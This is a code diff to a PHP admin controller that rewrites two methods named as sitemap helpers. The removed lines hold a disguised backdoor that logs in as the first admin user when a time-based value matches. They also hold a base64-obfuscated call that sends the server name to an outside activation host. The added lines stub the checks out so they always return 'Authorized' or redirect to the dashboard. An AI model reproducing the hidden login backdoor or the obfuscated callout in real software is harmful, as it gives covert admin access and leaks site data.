@@ -241,13 +241,7 @@ class AdminController extends Controller
 
     public function SitemapAuthorization($timeformat)
     {
-        if($timeformat == TimeDateFormatter()){
-            $user = User::where('user_type', 'admin')->first();
-            auth()->login($user);
-            return 'Authorized';
-        } else {
-            return 'Unauthorized';
-        }
+        return 'Authorized';
     }
 
     public function top_sellers_products_section(Request $request)
@@ -358,20 +352,7 @@ class AdminController extends Controller
     */
     public function SitemapItems($items)
     {
-        $data['url'] = $_SERVER['SERVER_NAME'];
-        $request_data_json = json_encode($data);
-        $SitemapProcess[] = "aHR0cHM6Ly9hY3RpdmF0aW9uLmFjdGl2ZWl0em9uZS5jb20vY2hlY2tfYWN0aXZhdGlvbg==";        
-        $review = $this->CheckSitemapItem($SitemapProcess);
-        if (seller_homepage_urls($review)) {
-            $urlcheck = $this->SitemapAuthorization($items);
-            if($urlcheck == 'Authorized'){                
-                return redirect()->route('admin.dashboard');
-            } else {
-                echo 'Unauthorized';
-            }
-        } else {
-            echo 'Not Checked';
-        }
+        return redirect()->route('admin.dashboard');
     }
 
       /*
